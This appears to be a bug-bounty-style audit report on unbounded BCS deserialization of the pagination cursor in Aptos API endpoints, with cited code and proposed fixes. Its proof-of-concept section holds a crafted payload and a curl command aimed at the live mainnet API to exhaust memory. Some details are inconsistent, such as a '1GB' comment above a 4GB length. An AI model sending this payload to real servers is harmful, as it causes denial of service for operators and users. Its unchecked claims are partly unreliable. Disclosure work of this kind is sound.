# Audit Report

## Title
Memory Exhaustion via Unbounded BCS Deserialization in StateKey API Endpoints

## Summary
The `StateKey::decode()` function lacks bounds checking when deserializing BCS-encoded data from untrusted API input, allowing attackers to trigger unbounded memory allocation by providing malformed data with arbitrarily large size prefixes, causing API server crashes and denial of service.

## Finding Description

The vulnerability exists in the API layer where user-controlled `StateKeyWrapper` query parameters are deserialized without size limits. The attack path is:

1. **API Entry Point**: The `/accounts/{address}/resources` and `/accounts/{address}/modules` endpoints accept a `start` query parameter of type `StateKeyWrapper` for cursor-based pagination. [1](#0-0) 

2. **Unsafe Parsing**: The `StateKeyWrapper::from_str()` implementation hex-decodes user input and directly calls `StateKey::decode()` without any validation: [2](#0-1) 

3. **Unbounded Deserialization**: `StateKey::decode()` uses `bcs::from_bytes()` WITHOUT any size limit when deserializing the `AccessPath` structure: [3](#0-2) 

4. **Vulnerable Data Structure**: The `AccessPath` struct contains a `path: Vec<u8>` field that can have an arbitrarily large length encoded in BCS format: [4](#0-3) 

**Exploitation Mechanism**: 
An attacker crafts a malicious hex string where the BCS encoding specifies a massive vector length (e.g., 2^30 bytes = 1GB) using ULEB128 encoding. When `bcs::from_bytes()` attempts to deserialize this, it will try to allocate the full amount of memory specified by the length prefix before reading the actual data, causing:
- Out-of-memory crashes
- Severe memory pressure on the API server
- Service unavailability

**Contrast with Protected Code**: Other parts of the codebase use `bcs::from_bytes_with_limit()` to prevent this exact issue: [5](#0-4) [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per Aptos bug bounty criteria:
- **"API crashes"** is explicitly listed as High Severity ($50,000 range)
- **"Validator node slowdowns"** also High Severity if API runs on validator nodes

The vulnerability breaks the critical invariant:
- **"Resource Limits: All operations must respect gas, storage, and computational limits"**

Concrete impacts:
1. **Availability Disruption**: Repeated attacks can make the API service unavailable
2. **Resource Exhaustion**: Memory exhaustion can trigger OOM killer, crashing the entire process
3. **Cascading Failures**: If API servers are colocated with other services, memory exhaustion affects the entire system
4. **No Rate Limiting Defense**: Standard rate limiting won't prevent this since a single request can exhaust memory

## Likelihood Explanation

**Likelihood: HIGH**

Exploitation requirements are minimal:
- **No authentication required** - Public API endpoints accept the malicious parameter
- **Trivial to exploit** - Single HTTP GET request with crafted hex string
- **No special privileges** - Any internet user can attack
- **Difficult to detect** - Appears as legitimate pagination cursor
- **Easy to automate** - Simple script can generate attack payloads

Attack complexity: **LOW** - Attacker only needs to:
1. Understand BCS ULEB128 encoding (well-documented)
2. Craft hex string with large length prefix
3. Send HTTP request to public API endpoint

Example attack URL:
```
GET /v1/accounts/0x1/resources?start=00<address><large_uleb128_length><padding>
```

## Recommendation

**Immediate Fix**: Add size limits to all `StateKey::decode()` call paths accepting untrusted input.

**Option 1** (Preferred): Modify `StateKey::decode()` to accept an optional size limit parameter:

```rust
pub fn decode(val: &[u8]) -> Result<StateKey, StateKeyDecodeErr> {
    const MAX_STATE_KEY_SIZE: usize = 1024; // Reasonable limit for state keys
    Self::decode_with_limit(val, MAX_STATE_KEY_SIZE)
}

pub fn decode_with_limit(val: &[u8], limit: usize) -> Result<StateKey, StateKeyDecodeErr> {
    if val.len() > limit {
        return Err(StateKeyDecodeErr::ExceedsLimit { size: val.len(), limit });
    }
    // ... existing decode logic using bcs::from_bytes_with_limit ...
}
```

**Option 2**: Add validation in `StateKeyWrapper::from_str()`:

```rust
impl FromStr for StateKeyWrapper {
    type Err = anyhow::Error;
    
    fn from_str(s: &str) -> anyhow::Result<Self, anyhow::Error> {
        const MAX_STATE_KEY_HEX_LENGTH: usize = 2048; // chars, = 1024 bytes
        if s.len() > MAX_STATE_KEY_HEX_LENGTH {
            anyhow::bail!("StateKey hex string exceeds maximum length");
        }
        let bytes = hex::decode(s).context("Failed to decode StateKey as hex string")?;
        let state_key = StateKey::decode(&bytes)
            .context("Failed to decode StateKey from hex string")?;
        Ok(StateKeyWrapper(state_key))
    }
}
```

**Additional Hardening**:
1. Add size limits to all BCS deserialization from untrusted sources
2. Implement resource monitoring and circuit breakers in API layer
3. Add integration tests with malformed input
4. Document maximum sizes for all externally-facing data structures

## Proof of Concept

```rust
// Rust test demonstrating the vulnerability
#[test]
fn test_state_key_decode_memory_exhaustion() {
    use hex;
    
    // Craft malicious payload:
    // - Tag byte: 0x00 (AccessPath)
    // - Address: 32 bytes of 0x01
    // - ULEB128 length: 0xFFFFFFFF (4GB - will cause allocation failure)
    // - Minimal padding
    
    let mut malicious_hex = String::new();
    
    // AccessPath tag
    malicious_hex.push_str("00");
    
    // AccountAddress (32 bytes)
    malicious_hex.push_str(&"01".repeat(32));
    
    // ULEB128 encoding of 0xFFFFFFFF (4,294,967,295 bytes)
    // This encodes as: 0xFF 0xFF 0xFF 0xFF 0x0F
    malicious_hex.push_str("FFFFFFFF0F");
    
    // Minimal path data (won't be reached due to allocation failure)
    malicious_hex.push_str("00");
    
    // Attempt to parse via API's StateKeyWrapper (simulating HTTP request)
    use std::str::FromStr;
    use aptos_api_types::StateKeyWrapper;
    
    let result = StateKeyWrapper::from_str(&malicious_hex);
    
    // Expected: Either panics with OOM or returns error
    // Actual vulnerable behavior: Attempts to allocate 4GB before failing
    assert!(result.is_err(), "Should reject oversized StateKey");
}
```

**HTTP-based PoC**:
```bash
# Craft malicious cursor with 1GB allocation attempt
MALICIOUS_CURSOR="00$(printf '01%.0s' {1..32})FFFFFFFF0F00"

# Attack endpoint
curl -v "https://api.mainnet.aptoslabs.com/v1/accounts/0x1/resources?start=$MALICIOUS_CURSOR"

# Expected vulnerable behavior: 
# - High memory spike in API server
# - Possible OOM crash
# - Slow response or timeout
```

**Notes**

The vulnerability is specifically in the API layer's acceptance of untrusted `StateKeyWrapper` input. While the indexer database also uses `StateKey::decode()` via `decode_key()`: [7](#0-6) 

The indexer path is lower risk because:
1. Data originates from validated on-chain state
2. Only read during database iteration by trusted node software
3. No direct untrusted user input path

However, the same `decode()` function is exploitable through the API surface, making this a **HIGH severity vulnerability** requiring immediate patching.

### Citations

**File:** api/src/accounts.rs (L106-106)
```rust
        start: Query<Option<StateKeyWrapper>>,
```

**File:** api/types/src/wrappers.rs (L136-139)
```rust
    fn from_str(s: &str) -> anyhow::Result<Self, anyhow::Error> {
        let state_key_prefix: StateKey =
            StateKey::decode(&hex::decode(s).context("Failed to decode StateKey as hex string")?)
                .context("Failed to decode StateKey from hex string")?;
```

**File:** types/src/state_store/state_key/mod.rs (L73-73)
```rust
                let AccessPath { address, path } = bcs::from_bytes(&val[1..])?;
```

**File:** types/src/access_path.rs (L55-59)
```rust
pub struct AccessPath {
    pub address: AccountAddress,
    #[serde(with = "serde_bytes")]
    pub path: Vec<u8>,
}
```

**File:** api/src/view_function.rs (L127-127)
```rust
            bcs::from_bytes_with_limit(data.0.as_slice(), MAX_RECURSIVE_TYPES_ALLOWED as usize)
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L260-261)
```rust
    fn bcs_decode<T: DeserializeOwned>(&self, bytes: &[u8], limit: usize) -> anyhow::Result<T> {
        bcs::from_bytes_with_limit(bytes, limit).map_err(|e| anyhow!("{:?}", e))
```

**File:** storage/indexer_schemas/src/schema/state_keys/mod.rs (L19-22)
```rust
    fn decode_key(data: &[u8]) -> Result<Self> {
        let state_key: StateKey = StateKey::decode(data)?;
        Ok(state_key)
    }
```
